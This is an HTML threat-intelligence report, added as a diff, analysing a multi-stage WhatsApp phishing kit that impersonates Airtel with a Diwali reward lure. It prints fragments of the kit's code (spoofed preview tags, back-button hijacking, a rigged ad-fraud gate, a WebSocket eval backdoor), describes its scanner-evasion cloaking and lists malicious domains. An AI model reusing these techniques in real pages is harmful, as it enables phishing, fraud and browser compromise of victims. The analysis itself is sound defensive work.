@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Threat Analysis — Diwali Phishing Kit</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0D1117;
+  --surface: #161B22;
+  --border: #21262D;
+  --text: #C9D1D9;
+  --text-dim: #6E7681;
+  --text-bright: #E6EDF3;
+  --red: #F85149;
+  --orange: #F0883E;
+  --blue: #58A6FF;
+  --green: #3FB950;
+  --yellow: #D29922;
+  --mono: 'IBM Plex Mono', monospace;
+  --sans: 'IBM Plex Sans', sans-serif;
+}
+@media (prefers-color-scheme: light) {
+  :root {
+    --bg: #0D1117;
+    --surface: #161B22;
+    --border: #21262D;
+    --text: #C9D1D9;
+    --text-dim: #6E7681;
+    --text-bright: #E6EDF3;
+  }
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-padding-top: env(safe-area-inset-top, 0px); }
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  font-size: 15px;
+  line-height: 1.7;
+  padding: env(safe-area-inset-top, 0px) env(safe-area-inset-right, 0px) env(safe-area-inset-bottom, 0px) env(safe-area-inset-left, 0px);
+}
+.top-bar {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 32px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--text-dim);
+  position: sticky;
+  top: 0;
+  z-index: 10;
+}
+.top-bar .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); }
+.top-bar .label { color: var(--red); font-weight: 600; }
+.container { max-width: 860px; margin: 0 auto; padding: 48px 32px 80px; }
+header { margin-bottom: 48px; border-bottom: 1px solid var(--border); padding-bottom: 32px; }
+.report-tag {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--red);
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  margin-bottom: 16px;
+}
+h1 {
+  font-family: var(--mono);
+  font-size: 28px;
+  font-weight: 600;
+  color: var(--text-bright);
+  line-height: 1.3;
+  margin-bottom: 20px;
+}
+.meta {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+  gap: 10px;
+  margin-top: 24px;
+}
+.meta-item {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 10px 14px;
+}
+.meta-item .key { font-family: var(--mono); font-size: 10px; color: var(--text-dim); margin-bottom: 3px; }
+.meta-item .val { font-size: 13px; color: var(--text-bright); font-weight: 500; word-break: break-all; }
+.exec-summary {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--red);
+  border-radius: 0 6px 6px 0;
+  padding: 20px 24px;
+  margin-bottom: 48px;
+}
+.exec-summary p { margin-bottom: 10px; }
+.exec-summary p:last-child { margin-bottom: 0; }
+h2 {
+  font-family: var(--mono);
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text-dim);
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  margin-bottom: 20px;
+  margin-top: 48px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+h2::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+h3 {
+  font-family: var(--mono);
+  font-size: 15px;
+  color: var(--text-bright);
+  font-weight: 600;
+  margin-bottom: 10px;
+  margin-top: 24px;
+}
+p { margin-bottom: 14px; }
+.stage {
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  margin-bottom: 16px;
+}
+.stage-header {
+  background: var(--surface);
+  padding: 14px 20px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  cursor: pointer;
+  user-select: none;
+}
+.stage-num {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--text-dim);
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 2px 7px;
+}
+.stage-title { color: var(--text-bright); font-weight: 600; flex: 1; }
+.sev {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 600;
+  padding: 3px 8px;
+  border-radius: 4px;
+}
+.sev.critical { background: rgba(248,81,73,.15); color: var(--red); border: 1px solid rgba(248,81,73,.3); }
+.sev.high { background: rgba(240,136,62,.15); color: var(--orange); border: 1px solid rgba(240,136,62,.3); }
+.sev.medium { background: rgba(210,153,34,.15); color: var(--yellow); border: 1px solid rgba(210,153,34,.3); }
+.stage-body { padding: 20px; border-top: 1px solid var(--border); }
+code, pre {
+  font-family: var(--mono);
+  font-size: 13px;
+}
+pre {
+  background: #010409;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 16px;
+  overflow-x: auto;
+  margin: 14px 0;
+  color: #A5D6FF;
+  line-height: 1.6;
+}
+code {
+  background: rgba(110,118,129,.2);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 1px 6px;
+  font-size: 12.5px;
+  color: #A5D6FF;
+}
+pre code { background: none; border: none; padding: 0; color: inherit; }
+.comment { color: #8B949E; }
+.str { color: #A5D6FF; }
+.kw { color: #FF7B72; }
+ul, ol { padding-left: 22px; margin-bottom: 14px; }
+li { margin-bottom: 6px; }
+table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; }
+th {
+  font-family: var(--mono);
+  font-size: 11px;
+  text-align: left;
+  padding: 8px 12px;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  color: var(--text-dim);
+}
+td {
+  padding: 9px 12px;
+  border-bottom: 1px solid var(--border);
+  vertical-align: top;
+}
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: rgba(255,255,255,.02); }
+.ioc-table td:first-child { font-family: var(--mono); font-size: 12px; color: var(--blue); }
+.finding-row { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 10px; }
+.finding-num { font-family: var(--mono); font-size: 11px; color: var(--text-dim); padding-top: 2px; min-width: 24px; }
+.rce-box {
+  background: rgba(248,81,73,.05);
+  border: 1px solid rgba(248,81,73,.2);
+  border-radius: 8px;
+  padding: 20px;
+  margin: 20px 0;
+}
+.rce-box .rce-label { font-family: var(--mono); font-size: 11px; color: var(--red); font-weight: 600; margin-bottom: 10px; }
+.worm-stat { display: flex; gap: 24px; margin: 16px 0; }
+.stat-box { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 14px 18px; flex: 1; }
+.stat-box .num { font-family: var(--mono); font-size: 24px; color: var(--red); font-weight: 600; }
+.stat-box .label { font-size: 12px; color: var(--text-dim); margin-top: 2px; }
+.chain {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+  margin: 16px 0;
+}
+.chain-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 13px;
+}
+.chain-item .arrow { color: var(--text-dim); font-family: var(--mono); font-size: 11px; }
+.chain-item .step { color: var(--text-bright); }
+.chain-item .detail { color: var(--text-dim); font-size: 12px; }
+.vis-label { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-bottom: 4px; }
+@media (max-width: 600px) {
+  .container { padding: 24px 16px 60px; }
+  h1 { font-size: 20px; }
+  .worm-stat { flex-direction: column; }
+  .meta { grid-template-columns: 1fr; }
+}
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+</head>
+<body>
+<div class="top-bar">
+  <div class="dot"></div>
+  <span class="label">THREAT INTEL</span>
+  <span>Phishing Kit Analysis · jfktl.buzz · October 2026</span>
+</div>
+
+<div class="container">
+  <header>
+    <div class="report-tag">DYNAMIC URL ANALYSIS REPORT</div>
+    <h1>Diwali WhatsApp Phishing Kit<br>Multi-Stage Campaign with WebSocket C2</h1>
+
+    <div class="meta">
+      <div class="meta-item">
+        <div class="key">TARGET URL</div>
+        <div class="val">jfktl.buzz/JCPxRmnWMp/in-en</div>
+      </div>
+      <div class="meta-item">
+        <div class="key">VECTOR</div>
+        <div class="val">WhatsApp · Malayalam · South India</div>
+      </div>
+      <div class="meta-item">
+        <div class="key">IMPERSONATES</div>
+        <div class="val">Airtel (₹2,000 Diwali reward lure)</div>
+      </div>
+      <div class="meta-item">
+        <div class="key">VIRUSTOTAL RESULT</div>
+        <div class="val" style="color:var(--green)">Clean — kit evades all static scanners</div>
+      </div>
+      <div class="meta-item">
+        <div class="key">TOOLS USED</div>
+        <div class="val">Burp Suite · Kali Linux VM · JS Deobfuscation</div>
+      </div>
+      <div class="meta-item">
+        <div class="key">THREAT ACTOR ORIGIN</div>
+        <div class="val">Chinese-speaking (Simplified Chinese debug strings)</div>
+      </div>
+    </div>
+  </header>
+
+  <div class="exec-summary">
+    <p>What appeared to be a routine festival phishing link was identified through Burp Suite interception and manual JavaScript deobfuscation as a professionally engineered five-stage operation. The campaign combines a polymorphic cloaking engine, a Vue 3 single-page application with Pinia state persistence, a self-propagating WhatsApp worm requiring 19 forced shares, a CPA ad fraud loop with a rigged 70% rejection rate, and a persistent WebSocket Command-and-Control backdoor capable of executing arbitrary JavaScript inside a victim's mobile browser in real time.</p>
+    <p>The kit correctly evaded VirusTotal because desktop security scanners receive only a 404 decoy — the real payload is served exclusively to mobile browsers that pass a triple environment check. This report documents the full five-stage architecture, the attack chain, all identified indicators of compromise, and the remote code execution sink discovered in the C2 module.</p>
+  </div>
+
+  <h2>Attack Chain</h2>
+  <div class="chain">
+    <div class="chain-item"><span class="arrow">01 →</span><span class="step">WhatsApp message received</span><span class="detail"> — Malayalam lure, spoofed Airtel preview card, og:url set to whatsapp.com</span></div>
+    <div class="chain-item"><span class="arrow">02 →</span><span class="step">Gateway cloaking check</span><span class="detail"> — desktops/scanners → 404 decoy; mobile phones → 90-char single-use token</span></div>
+    <div class="chain-item"><span class="arrow">03 →</span><span class="step">Vue 3 SPA loads</span><span class="detail"> — victim profiled, referral tree recorded, geolocation fingerprinted</span></div>
+    <div class="chain-item"><span class="arrow">04 →</span><span class="step">Phone number harvested</span><span class="detail"> — submitted to /api/h5heart/port with device OS, country, IP</span></div>
+    <div class="chain-item"><span class="arrow">05 →</span><span class="step">19 forced WhatsApp shares</span><span class="detail"> — each generates unique referral URL mapping propagation tree</span></div>
+    <div class="chain-item"><span class="arrow">06 →</span><span class="step">CPA ad fraud loop</span><span class="detail"> — rigged 70% rejection rate forces 6–8 extra ad clicks per task</span></div>
+    <div class="chain-item"><span class="arrow">07 →</span><span class="step">WebSocket C2 active throughout</span><span class="detail"> — eval() backdoor enables real-time payload delivery to victim browser</span></div>
+    <div class="chain-item"><span class="arrow">08 →</span><span class="step">Dead-end payout</span><span class="detail"> — no reward delivered; operator profits from ad fraud + harvested PII</span></div>
+  </div>
+
+  <h2>Stage Analysis</h2>
+
+  <div class="stage">
+    <div class="stage-header">
+      <span class="stage-num">STAGE 1</span>
+      <span class="stage-title">Polymorphic Gateway & WhatsApp Preview Spoofing</span>
+      <span class="sev high">HIGH</span>
+    </div>
+    <div class="stage-body">
+      <p>The entry URL encodes campaign metadata across four parameters: a rotating 10-character slug evading URL blocklists, a country-language code (<code>in-en</code>), a 19-digit referral token (first 15 digits = sharer's victim ID, last 4 = random entropy), and a Unix timestamp recording share creation time.</p>
+
+      <h3>WhatsApp OG Tag Spoofing</h3>
+      <p>The gateway serves crafted Open Graph tags that cause WhatsApp's link preview crawler to display a convincing Airtel-branded card with <code>og:url</code> set to <code>https://whatsapp.com</code> — bypassing the most basic defence of checking the URL:</p>
+      <pre><span class="str">&lt;title&gt;</span>🪔Airtel - ദീപാവലി സമ്മാനം!🎁<span class="str">&lt;/title&gt;</span>
+<span class="str">&lt;meta property="og:url" content="https://whatsapp.com"&gt;</span>
+<span class="str">&lt;meta property="og:description" content="₹2,000 ..."&gt;</span></pre>
+
+      <h3>Polymorphic Cloaking — Variable Name Mutation</h3>
+      <p>The inline bouncer script regenerates with entirely new variable names on every server request, defeating hash-based AV signatures:</p>
+      <pre><span class="comment">// Three consecutive captures, identical logic, different names:</span>
+Capture 1: KMKBDs, beIkdB, OmBMan, SXJoVX, pbtDry
+Capture 2: WAAWvP, dEARar, kpPkAN, IqbFqx, GkVVtu
+Capture 3: MSReKm, bIUxNz, IbykBW, HFLKLX, ZKmTUo</pre>
+
+      <p>When decoded the logic is identical — a triple environment check: <code>navigator.platform</code> for Win/Mac/X11, <code>availWidth &gt; availHeight</code> for landscape screens. Desktop browsers receive a 404 decoy. Mobile phones are redirected to a time-gated 90-character single-use token URL.</p>
+    </div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-header">
+      <span class="stage-num">STAGE 2</span>
+      <span class="stage-title">Vue 3 SPA — Victim Profiling, Fake Social Proof & Browser Lockdown</span>
+      <span class="sev high">HIGH</span>
+    </div>
+    <div class="stage-body">
+      <p>Mobile visitors receive a compiled Vite + Vue 3 SPA (<code>MyAppVersion: 2561</code>). Developer debug strings in Simplified Chinese confirm core kit authorship by Chinese-speaking threat actors. Pinia v2.3.1 with localStorage persistence ensures victim progress survives tab closes.</p>
+
+      <h3>Victim Data Collected</h3>
+      <ul>
+        <li>Auto-generated 15-digit victim ID (first 4 digits = MMDD, remaining 11 = weak random)</li>
+        <li>Phone number, WhatsApp/Telegram/Messenger/Line share counts</li>
+        <li>Real IP via Cloudflare <code>/cdn-cgi/trace</code> endpoint abuse</li>
+        <li>Full <code>navigator.userAgent</code>, country, language</li>
+        <li>Referral tree linkage via 19-digit inviter_id extraction</li>
+      </ul>
+
+      <h3>Fake Social Proof</h3>
+      <p>A Facebook-style comment section runs two timers: reaction/comment/share counters randomly increment every 5 seconds, comment timestamps age by 1 minute every 60 seconds — simulating a live active thread.</p>
+
+      <h3>Back Button Hijacking</h3>
+      <pre><span class="comment">// Flood history stack — back button sends victim to another scam domain</span>
+<span class="kw">for</span> (<span class="kw">let</span> t = 1; t &lt; 4; t++) {
+    history.pushState(history.length + 1, <span class="str">"message"</span>, <span class="str">"#"</span> + (<span class="kw">new</span> Date).getTime());
+}
+window.addEventListener(<span class="str">"popstate"</span>, l);   <span class="comment">// hijack back gesture</span>
+window.addEventListener(<span class="str">"pagehide"</span>, l);  <span class="comment">// hijack tab close</span></pre>
+    </div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-header">
+      <span class="stage-num">STAGE 3</span>
+      <span class="stage-title">WhatsApp Self-Propagating Worm Engine</span>
+      <span class="sev high">HIGH</span>
+    </div>
+    <div class="stage-body">
+      <div class="worm-stat">
+        <div class="stat-box"><div class="num">19</div><div class="label">Forced shares before reward unlocks</div></div>
+        <div class="stat-box"><div class="num">4</div><div class="label">Platforms: WhatsApp, Telegram, Messenger, LINE</div></div>
+        <div class="stat-box"><div class="num">∞</div><div class="label">Unique referral URLs — no two links identical</div></div>
+      </div>
+      <pre><span class="comment">// WhatsApp deep link — opens native app with pre-populated scam message</span>
+window.location.href = <span class="str">"whatsapp://send?text="</span> 
+  + encodeURIComponent(msg) + <span class="str">"%0A"</span> + encodeURIComponent(url);</pre>
+      <p>Each share embeds the new victim's 15-digit ID as the referral parameter, creating a mathematically trackable viral propagation tree across the entire WhatsApp network. Share detection uses a focus/blur timing heuristic — measuring browser backgrounding duration to infer whether a message was actually sent.</p>
+    </div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-header">
+      <span class="stage-num">STAGE 4</span>
+      <span class="stage-title">CPA Ad Fraud — Rigged Payout Gate</span>
+      <span class="sev medium">MEDIUM</span>
+    </div>
+    <div class="stage-body">
+      <p>After 19 shares, victims must complete 3 "sponsor tasks." Two gates ensure victims almost never succeed:</p>
+      <pre><span class="comment">// Gate 1: Return in under 10s → rejected, another ad click forced</span>
+<span class="kw">if</span> (JSON.parse(localStorage.getItem(<span class="str">"clickTaskTime"</span>)) &gt; Date.now()) {
+    rI(e); <span class="comment">// force new ad click</span>
+    <span class="kw">return false</span>;
+}
+
+<span class="comment">// Gate 2: 70% artificial rejection even after waiting 10+ seconds</span>
+<span class="kw">if</span> (n.apps &gt;= r.appsMustCount &amp;&amp; !(Math.random() &lt; r.appsPercent)) {
+    <span class="comment">// appsPercent = 0.3 → fails 70% of the time</span>
+    rI(e);
+    <span class="kw">return</span>;
+}</pre>
+      <p>Statistically requires 6–8 additional ad clicks per task (1/0.3 ≈ 3.3 attempts per task × 2 remaining tasks). Even victims who complete all tasks reach a static text paragraph — no payment gateway, no UPI integration, no reward ever delivered.</p>
+    </div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-header">
+      <span class="stage-num">STAGE 5</span>
+      <span class="stage-title">WebSocket C2 Backdoor — Remote Code Execution</span>
+      <span class="sev critical">CRITICAL</span>
+    </div>
+    <div class="stage-body">
+      <p>Two seconds after the SPA mounts, a WebSocket C2 module is silently injected from the Node.js/Express backend with 3-second auto-reconnect and 10-second heartbeat. All console output is suppressed — the WebSocket is invisible in browser DevTools.</p>
+
+      <div class="rce-box">
+        <div class="rce-label">⚠ REMOTE CODE EXECUTION SINK</div>
+        <pre><span class="comment">// socket.onmessage in ws.js — executes any Base64-encoded JS payload</span>
+<span class="kw">if</span> (tmpdata[<span class="str">"cmd"</span>] == <span class="str">"userExecute"</span>) {
+    eval(base64ToUtf8(tmpdata[<span class="str">"shell"</span>]));
+}</pre>
+      </div>
+
+      <p>The C2 operator receives each victim's phone number, device OS, country, and IP via <code>/api/h5heart/port</code> — enabling targeted payload delivery to high-value victims:</p>
+      <ul>
+        <li><strong>Credential overlay injection</strong> — replace fake giveaway with spoofed Airtel/bank login or OTP prompt</li>
+        <li><strong>Trojanised APK download</strong> — force-download banking malware disguised as reward claim app</li>
+        <li><strong>Victim pivoting</strong> — redirect specific targets to secondary exploit kits or WAP billing fraud</li>
+        <li><strong>UPI PIN harvesting</strong> — inject payment overlay after victim has been socially conditioned</li>
+      </ul>
+    </div>
+  </div>
+
+  <h2>Why VirusTotal Showed Clean</h2>
+  <ul>
+    <li><strong>Polymorphic JS</strong> — variable names change per request, defeating hash-based signatures</li>
+    <li><strong>Desktop cloaking</strong> — VirusTotal scanners receive the 13-byte 404 decoy, never the real payload</li>
+    <li><strong>Time-gated tokens</strong> — replaying captured URLs returns no payload (token expired)</li>
+    <li><strong>Cloudflare CDN</strong> — legitimate CDN masking infrastructure reputation</li>
+    <li><strong>.buzz TLD rotation</strong> — fresh domains cycle before blocklists propagate</li>
+  </ul>
+
+  <h2>Indicators of Compromise</h2>
+  <table class="ioc-table">
+    <tr><th>Category</th><th>Indicator</th><th>Role</th></tr>
+    <tr><td>jfktl.buzz</td><td>Primary domain</td><td>Stage 1 gateway + Vue SPA host</td></tr>
+    <tr><td>paedg.top</td><td>Analytics</td><td>Plausible Analytics tracking (data-domain: m-02-6e7k58if)</td></tr>
+    <tr><td>sfaehe.buzz, lnczfe.buzz, ohtdaw.buzz, hvxfzw.buzz, nvzeag.buzz</td><td>Ad rotation pool</td><td>CPA offer API domains</td></tr>
+    <tr><td>bgv.eiply.buzz, cje.fedlw.buzz, gis.nseef.buzz</td><td>Affiliate redirects</td><td>Ad fraud destinations (utm_campaign=m02001)</td></tr>
+    <tr><td>/api/h5heart/port, /api/h5heart/ws.js</td><td>C2 endpoints</td><td>PII exfiltration + WebSocket C2</td></tr>
+    <tr><td>/base.json, /domains.json, /ads.json, /assets_2561.json</td><td>Config artifacts</td><td>Campaign configuration manifests</td></tr>
+    <tr><td>akmsdnhaklsdjalskdasd</td><td>Magic string</td><td>Liveness marker — links all five stages to one actor</td></tr>
+    <tr><td>hostid: 6e7k58if · mb: 002001 · MyAppVersion: 2561</td><td>Campaign IDs</td><td>Affiliate attribution + build version</td></tr>
+  </table>
+
+  <h2>Recommendations</h2>
+  <ul>
+    <li>Block <code>.buzz</code> TLD at DNS/firewall level as elevated-risk indicator</li>
+    <li>Deploy IDS signatures matching the magic string <code>akmsdnhaklsdjalskdasd</code> in HTTP responses</li>
+    <li>Train users that WhatsApp preview cards can display any domain — the displayed URL is not the actual destination</li>
+    <li>Treat VirusTotal clean results as insufficient evidence of safety for social-media-distributed links</li>
+    <li>Monitor for WebSocket connections from mobile devices to unknown <code>.buzz</code> domains</li>
+  </ul>
+
+  <h2>Conclusion</h2>
+  <p>This campaign sits well above the typical social engineering phishing kit. The polymorphic cloaking engine, Vue 3 SPA architecture, viral worm propagation, and live WebSocket eval() backdoor place it in the category of a commercially distributed crimeware framework — likely authored by Chinese-speaking threat actors and licensed to South Indian affiliates for the 2026 Diwali campaign cycle.</p>
+  <p>The most dangerous component is not the credential phishing but the C2 backdoor: any victim with the page open in their mobile browser is compromised at the browser level, with the operator capable of delivering targeted payloads on demand. The social engineering vector — a festival message in the victim's native language from a trusted contact — combined with this technical depth makes the campaign highly effective and resistant to conventional detection.</p>
+</div>
+</body>
+</html>
